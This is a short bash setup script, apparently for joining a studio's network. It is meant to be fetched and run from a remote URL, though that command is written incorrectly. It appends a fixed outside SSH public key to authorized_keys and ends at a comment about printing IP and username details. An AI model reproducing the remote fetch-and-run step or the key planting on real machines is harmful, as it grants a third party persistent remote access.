#!/bin/bash
# To run this script type
# sh -c "$(https://lnk.coto.studio/setup)"

## generate ssh-keys
ssh-keygen -t ed25519

# Add network key to authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK40CjVSstXJ/r9ulgHcRGQkV6/MBmOPxOufq076KMOx" >> authorized_keys

# Install Xcode command line tools if running on macos 
if [[ $OSTYPE == 'darwin'* ]]; then
  sudo xcode-select --install
fi

# Print out ip and username info